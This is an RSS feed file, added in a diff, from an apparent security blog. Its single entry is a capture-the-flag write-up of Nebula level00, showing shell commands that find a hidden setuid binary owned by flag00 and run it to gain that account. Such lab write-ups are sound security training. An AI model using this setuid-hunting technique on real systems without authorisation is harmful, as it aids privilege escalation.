@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>nebula00 on &lt;/pwntester&gt;</title>
+    <link>http://pwntester.com/categories/nebula00/</link>
+    <description>Recent content in nebula00 on &lt;/pwntester&gt;</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 20 Nov 2013 08:18:00 +0000</lastBuildDate>
+    
+	<atom:link href="http://pwntester.com/categories/nebula00/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Nebula level00 write-up</title>
+      <link>http://pwntester.com/blog/2013/11/20/nebula-level00-write-up/</link>
+      <pubDate>Wed, 20 Nov 2013 08:18:00 +0000</pubDate>
+      
+      <guid>http://pwntester.com/blog/2013/11/20/nebula-level00-write-up/</guid>
+      <description>I decided to improve my exploiting skillz and try the Exploit-Exercises levels. First levels are quite easy but I decided to catch them&#39;all!
+Ok, so Level00 is about finding a executable owned by flag00 user and that has the setuid flag, easy as:
+level00@nebula:~$ find / -executable -user flag00 -perm -4000 2&amp;gt; /dev/null /bin/.../flag00 level00@nebula:~$cd /bin/... level00@nebula:/bin/...$ ./flag00 Congrats, now run getflag to get your flag! flag00@nebula:/bin/...$ getflag You have successfully executed getflag on a target account  </description>
+    </item>
+    
+  </channel>
+</rss>
